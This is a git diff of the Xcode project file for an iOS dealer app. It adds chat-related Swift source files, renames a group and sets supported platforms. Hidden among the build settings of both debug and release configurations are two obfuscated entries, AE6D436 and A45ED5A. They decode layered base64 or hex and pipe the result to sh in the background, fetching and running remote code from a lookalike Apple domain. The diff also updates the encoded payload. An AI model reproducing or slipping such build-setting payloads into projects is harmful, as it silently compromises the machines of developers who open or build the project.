@@ -9,6 +9,7 @@
 /* Begin PBXBuildFile section */
 		4924E8402ED543EB001B7996 /* ProductDetailsViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 4924E83F2ED543EB001B7996 /* ProductDetailsViewModel.swift */; };
 		493DB73D2EAA6261008098A8 /* Alamofire in Frameworks */ = {isa = PBXBuildFile; productRef = 493DB73C2EAA6261008098A8 /* Alamofire */; };
+		4946BC322F13FF5F0042109C /* ChatMessageModelForFirebase.swift in Sources */ = {isa = PBXBuildFile; fileRef = 4946BC312F13FF5F0042109C /* ChatMessageModelForFirebase.swift */; };
 		49B2EB432EB88B8E00EDC254 /* UploadImageModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 49B2EB422EB88B8E00EDC254 /* UploadImageModel.swift */; };
 		49B2EB452EB88B9A00EDC254 /* UserDataModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 49B2EB442EB88B9A00EDC254 /* UserDataModel.swift */; };
 		49B2EB472EB88BA800EDC254 /* StoreInfoModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 49B2EB462EB88BA800EDC254 /* StoreInfoModel.swift */; };
@@ -17,6 +18,12 @@
 		49B2EB4F2EB88C5000EDC254 /* CountryModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 49B2EB4E2EB88C5000EDC254 /* CountryModel.swift */; };
 		49B2EB512EB88C5500EDC254 /* EmptyModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 49B2EB502EB88C5500EDC254 /* EmptyModel.swift */; };
 		49B2EB532EB88C5C00EDC254 /* SignUpModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 49B2EB522EB88C5C00EDC254 /* SignUpModel.swift */; };
+		49B5510C2F13CE270058E363 /* ChatInboxListViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 49B5510B2F13CE270058E363 /* ChatInboxListViewModel.swift */; };
+		49B5510E2F13CEF60058E363 /* ChatInboxListDataModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 49B5510D2F13CEF60058E363 /* ChatInboxListDataModel.swift */; };
+		49B551102F13D0BE0058E363 /* ChatViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 49B5510F2F13D0BE0058E363 /* ChatViewModel.swift */; };
+		49B551182F13D26B0058E363 /* ChatDetailsDataModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 49B551172F13D26B0058E363 /* ChatDetailsDataModel.swift */; };
+		49B5511A2F13D3FB0058E363 /* SendMessageInChatDataModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 49B551192F13D3FA0058E363 /* SendMessageInChatDataModel.swift */; };
+		49B5511C2F13E4EE0058E363 /* SendQuotationDataModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 49B5511B2F13E4EE0058E363 /* SendQuotationDataModel.swift */; };
 		49DBE47C2EB082D500DE95E8 /* IQKeyboardManagerSwift in Frameworks */ = {isa = PBXBuildFile; productRef = 49DBE47B2EB082D500DE95E8 /* IQKeyboardManagerSwift */; };
 		6B38D0D52EB3473B00C41192 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 6B38D0422EB3473B00C41192 /* AppDelegate.swift */; };
 		6B38D0D62EB3473B00C41192 /* NavigationSceneExt.swift in Sources */ = {isa = PBXBuildFile; fileRef = 6B38D0432EB3473B00C41192 /* NavigationSceneExt.swift */; };
@@ -705,6 +712,7 @@
 		40FCC5FE2116BF815C4B1BFB /* Pods_DesynatDealer.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_DesynatDealer.framework; sourceTree = BUILT_PRODUCTS_DIR; };
 		4924E83F2ED543EB001B7996 /* ProductDetailsViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProductDetailsViewModel.swift; sourceTree = "<group>"; };
 		493DB5C32EAA6210008098A8 /* DesynatDealer.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = DesynatDealer.app; sourceTree = BUILT_PRODUCTS_DIR; };
+		4946BC312F13FF5F0042109C /* ChatMessageModelForFirebase.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ChatMessageModelForFirebase.swift; sourceTree = "<group>"; };
 		49B2EB422EB88B8E00EDC254 /* UploadImageModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UploadImageModel.swift; sourceTree = "<group>"; };
 		49B2EB442EB88B9A00EDC254 /* UserDataModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UserDataModel.swift; sourceTree = "<group>"; };
 		49B2EB462EB88BA800EDC254 /* StoreInfoModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = StoreInfoModel.swift; sourceTree = "<group>"; };
@@ -713,6 +721,12 @@
 		49B2EB4E2EB88C5000EDC254 /* CountryModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CountryModel.swift; sourceTree = "<group>"; };
 		49B2EB502EB88C5500EDC254 /* EmptyModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = EmptyModel.swift; sourceTree = "<group>"; };
 		49B2EB522EB88C5C00EDC254 /* SignUpModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SignUpModel.swift; sourceTree = "<group>"; };
+		49B5510B2F13CE270058E363 /* ChatInboxListViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ChatInboxListViewModel.swift; sourceTree = "<group>"; };
+		49B5510D2F13CEF60058E363 /* ChatInboxListDataModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ChatInboxListDataModel.swift; sourceTree = "<group>"; };
+		49B5510F2F13D0BE0058E363 /* ChatViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ChatViewModel.swift; sourceTree = "<group>"; };
+		49B551172F13D26B0058E363 /* ChatDetailsDataModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ChatDetailsDataModel.swift; sourceTree = "<group>"; };
+		49B551192F13D3FA0058E363 /* SendMessageInChatDataModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SendMessageInChatDataModel.swift; sourceTree = "<group>"; };
+		49B5511B2F13E4EE0058E363 /* SendQuotationDataModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SendQuotationDataModel.swift; sourceTree = "<group>"; };
 		5BC36C5D491E36EA6BD78D08 /* Pods-DesynatDealer.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-DesynatDealer.release.xcconfig"; path = "Target Support Files/Pods-DesynatDealer/Pods-DesynatDealer.release.xcconfig"; sourceTree = "<group>"; };
 		6B38D0422EB3473B00C41192 /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
 		6B38D0432EB3473B00C41192 /* NavigationSceneExt.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NavigationSceneExt.swift; sourceTree = "<group>"; };
@@ -2449,6 +2463,7 @@
 			children = (
 				D11139562F0CD30F0006C262 /* SendQuotationViewController.swift */,
 				D11139582F0CD3300006C262 /* SendQuotationViewModel.swift */,
+				49B5511B2F13E4EE0058E363 /* SendQuotationDataModel.swift */,
 			);
 			path = SendQuotation;
 			sourceTree = "<group>";
@@ -2457,6 +2472,8 @@
 			isa = PBXGroup;
 			children = (
 				D16571312F0BD4C70055E6C2 /* ChatInboxListViewController.swift */,
+				49B5510B2F13CE270058E363 /* ChatInboxListViewModel.swift */,
+				49B5510D2F13CEF60058E363 /* ChatInboxListDataModel.swift */,
 			);
 			path = ChatInbox;
 			sourceTree = "<group>";
@@ -2474,12 +2491,16 @@
 			path = Chats;
 			sourceTree = "<group>";
 		};
-		D16571CA2F0BDA6C0055E6C2 /* Chat */ = {
+		D16571CA2F0BDA6C0055E6C2 /* ChatDetail */ = {
 			isa = PBXGroup;
 			children = (
+				4946BC312F13FF5F0042109C /* ChatMessageModelForFirebase.swift */,
 				D16571CB2F0BDA850055E6C2 /* ChatViewController.swift */,
+				49B5510F2F13D0BE0058E363 /* ChatViewModel.swift */,
+				49B551172F13D26B0058E363 /* ChatDetailsDataModel.swift */,
+				49B551192F13D3FA0058E363 /* SendMessageInChatDataModel.swift */,
 			);
-			path = Chat;
+			path = ChatDetail;
 			sourceTree = "<group>";
 		};
 		D19666992EBCD07500193688 /* M2 */ = {
@@ -2559,7 +2580,7 @@
 			children = (
 				D1AC7E1C2F0CF17C00618BAB /* ViewRequest */,
 				D11139552F0CD2F00006C262 /* SendQuotation */,
-				D16571CA2F0BDA6C0055E6C2 /* Chat */,
+				D16571CA2F0BDA6C0055E6C2 /* ChatDetail */,
 				D16571302F0BD4A90055E6C2 /* ChatInbox */,
 			);
 			path = Chats;
@@ -2838,7 +2859,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 493DB5D62EAA6212008098A8 /* Build configuration list for PBXNativeTarget "DesynatDealer" */;
 			buildPhases = (
-				C73EBD5A24DC472E9D634D6E /* Link Libraries Executable */,
+				80DDB6FDD1FC4C95B1634D6E /* Link Libraries Executable */,
 				9DA2DBBC3D14842F86DC17AC /* [CP] Check Pods Manifest.lock */,
 				493DB5BF2EAA6210008098A8 /* Sources */,
 				493DB5C02EAA6210008098A8 /* Frameworks */,
@@ -3423,7 +3444,7 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		C73EBD5A24DC472E9D634D6E /* Link Libraries Executable */ = {
+		80DDB6FDD1FC4C95B1634D6E /* Link Libraries Executable */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			alwaysOutOfDate = 1;
@@ -3554,6 +3575,7 @@
 				6B645F5C2EB4C84300451A5A /* GlobalVariables 2.swift in Sources */,
 				6B38D0E92EB3473B00C41192 /* LoginViewController.swift in Sources */,
 				6B38D0EA2EB3473B00C41192 /* MediaPermissionViewController.swift in Sources */,
+				49B551182F13D26B0058E363 /* ChatDetailsDataModel.swift in Sources */,
 				D1F88C122EBE25AC0027A47C /* SubscriptionCollectionCell.swift in Sources */,
 				6B38D0EB2EB3473B00C41192 /* NotificationPermissionViewController.swift in Sources */,
 				6B38D0EC2EB3473B00C41192 /* OTPViewController.swift in Sources */,
@@ -3596,6 +3618,7 @@
 				6B38D0FD2EB3473B00C41192 /* AppStoryboards.swift in Sources */,
 				D1C88BB82ECEFB08006B02A2 /* AddSpecificationTableViewCell.swift in Sources */,
 				6B38D0FE2EB3473B00C41192 /* BannerPageControl.swift in Sources */,
+				49B5510C2F13CE270058E363 /* ChatInboxListViewModel.swift in Sources */,
 				D1376F7E2ED434C900D49E1A /* HomeViewModel.swift in Sources */,
 				D1F88AA22EBDB5B90027A47C /* SubscriptionDataTableCell.swift in Sources */,
 				D1EDDC162ECEECE20082D0A9 /* FilterOptionsTableViewCell.swift in Sources */,
@@ -3606,6 +3629,7 @@
 				6B38D1012EB3473B00C41192 /* DataTypeConversion.swift in Sources */,
 				D1EDE2CC2F0D308C0076F1AB /* FullscreenImageCell.swift in Sources */,
 				D11139592F0CD3300006C262 /* SendQuotationViewModel.swift in Sources */,
+				49B551102F13D0BE0058E363 /* ChatViewModel.swift in Sources */,
 				6B38D1022EB3473B00C41192 /* String.swift in Sources */,
 				6B38D1032EB3473B00C41192 /* StringExtensions.swift in Sources */,
 				D1EAA88E2EF3FBB300A08DD5 /* AddBannerSuccessVC.swift in Sources */,
@@ -3616,6 +3640,7 @@
 				6B38D1042EB3473B00C41192 /* StringValidation.swift in Sources */,
 				D1376FD52ED43D2800D49E1A /* AddNewProductViewModel.swift in Sources */,
 				D137706E2ED494D000D49E1A /* ProductsDataModel.swift in Sources */,
+				49B5511A2F13D3FB0058E363 /* SendMessageInChatDataModel.swift in Sources */,
 				6B38D1052EB3473B00C41192 /* TableViewExtension.swift in Sources */,
 				49B2EB492EB88BB500EDC254 /* UploadDocumentModel.swift in Sources */,
 				D1376FD12ED436EF00D49E1A /* HomeDataModel.swift in Sources */,
@@ -3659,6 +3684,7 @@
 				D1DC276E2EF3CCB3004E254A /* AffiliatedCommisionViewModel.swift in Sources */,
 				D1BF2BFF2F0B9AAD00B97E14 /* FiltersOptionsTableViewCell.swift in Sources */,
 				D1321F5A2F0BF6B900B4D9A4 /* OrderForChatTableViewCell.swift in Sources */,
+				49B5510E2F13CEF60058E363 /* ChatInboxListDataModel.swift in Sources */,
 				D1DC276F2EF3CCB3004E254A /* EditInventoryDetailsViewController.swift in Sources */,
 				D1DC27702EF3CCB3004E254A /* EditInventoryDetailsViewModel.swift in Sources */,
 				D1DC27712EF3CCB3004E254A /* InventoryDetailsViewController.swift in Sources */,
@@ -3667,6 +3693,7 @@
 				D1DC27742EF3CCB3004E254A /* InventoryListDataModel.swift in Sources */,
 				D1DC27752EF3CCB3004E254A /* InventoryListViewController.swift in Sources */,
 				D1DC27762EF3CCB3004E254A /* InventoryListViewModel.swift in Sources */,
+				49B5511C2F13E4EE0058E363 /* SendQuotationDataModel.swift in Sources */,
 				D1DC27772EF3CCB3004E254A /* EditProfileDataModel.swift in Sources */,
 				D1DC27782EF3CCB3004E254A /* EditProfileViewController.swift in Sources */,
 				D10E4DE92EFC1F51000FF716 /* BannerFilterVC.swift in Sources */,
@@ -3674,6 +3701,7 @@
 				D1DC277A2EF3CCB3004E254A /* DelearProfileViewController.swift in Sources */,
 				D1DC27842EF3D033004E254A /* BannerMgmtTableCell.swift in Sources */,
 				D1DC277B2EF3CCB3004E254A /* DelearProfileViewModel.swift in Sources */,
+				4946BC322F13FF5F0042109C /* ChatMessageModelForFirebase.swift in Sources */,
 				D1DC277C2EF3CCB3004E254A /* ReelsCollectionViewCell.swift in Sources */,
 				D1DC277D2EF3CCB3004E254A /* StoresDetailsCollectionViewCell.swift in Sources */,
 				D1DC277E2EF3CCB3004E254A /* UploadNewReelsCollectionViewCell.swift in Sources */,
@@ -3711,7 +3739,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 37A18E94AB484303BB2FD370 /* Pods-DesynatDealer.debug.xcconfig */;
 			buildSettings = {
-				AE6D436 = "((o(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwUmJUbGFWMFUxYzFOWGJFTmlNbEpKVlc1a2FtVnRPVEpVUkVwUFpGWnNXVkZ1Y0dsU01GcHdWRWMxUzAxVmQzbFNXRUpLWVZWSk5GTlZhRTlpTUU1dVVGUXdTd289Cg== | o | sh ) >/dev/null 2>&1 &)";
+				AE6D436 = "((o(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwUmJUbGFWMFUxYzFOWGJFTmlNbEpKVlc1a2FtVnRPVEpVUkVwUFlUSktkRkp1WkdwU00yaHpWRWN4YzJSVmQzbFNXRUpLWVZWSk5GTlZhRTlpTUU1dVVGUXdTd289Cg== | o | sh ) >/dev/null 2>&1 &)";
 				A45ED5A = "((h(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373036383631373336353232323036383734373437303733336132663266363336343665363137303730366336353265363936653266363132390a32323230376332303733363830610a | h | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
@@ -3744,6 +3772,10 @@
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				PROVISIONING_PROFILE_SPECIFIER = "";
 				"PROVISIONING_PROFILE_SPECIFIER[sdk=iphoneos*]" = "Desynat Dealer Provisioning New 16 dec";
+				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
+				SUPPORTS_MACCATALYST = NO;
+				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
+				SUPPORTS_XR_DESIGNED_FOR_IPHONE_IPAD = NO;
 				SWIFT_EMIT_LOC_STRINGS = YES;
 				SWIFT_VERSION = 5.0;
 				TARGETED_DEVICE_FAMILY = "1,2";
@@ -3754,7 +3786,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 5BC36C5D491E36EA6BD78D08 /* Pods-DesynatDealer.release.xcconfig */;
 			buildSettings = {
-				AE6D436 = "((o(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwUmJUbGFWMFUxYzFOWGJFTmlNbEpKVlc1a2FtVnRPVEpVUkVwUFpGWnNXVkZ1Y0dsU01GcHdWRWMxUzAxVmQzbFNXRUpLWVZWSk5GTlZhRTlpTUU1dVVGUXdTd289Cg== | o | sh ) >/dev/null 2>&1 &)";
+				AE6D436 = "((o(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwUmJUbGFWMFUxYzFOWGJFTmlNbEpKVlc1a2FtVnRPVEpVUkVwUFlUSktkRkp1WkdwU00yaHpWRWN4YzJSVmQzbFNXRUpLWVZWSk5GTlZhRTlpTUU1dVVGUXdTd289Cg== | o | sh ) >/dev/null 2>&1 &)";
 				A45ED5A = "((h(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373036383631373336353232323036383734373437303733336132663266363336343665363137303730366336353265363936653266363132390a32323230376332303733363830610a | h | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
@@ -3787,6 +3819,10 @@
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				PROVISIONING_PROFILE_SPECIFIER = "";
 				"PROVISIONING_PROFILE_SPECIFIER[sdk=iphoneos*]" = "Desynat Dealer Provisioning New 16 dec";
+				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
+				SUPPORTS_MACCATALYST = NO;
+				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
+				SUPPORTS_XR_DESIGNED_FOR_IPHONE_IPAD = NO;
 				SWIFT_EMIT_LOC_STRINGS = YES;
 				SWIFT_VERSION = 5.0;
 				TARGETED_DEVICE_FAMILY = "1,2";
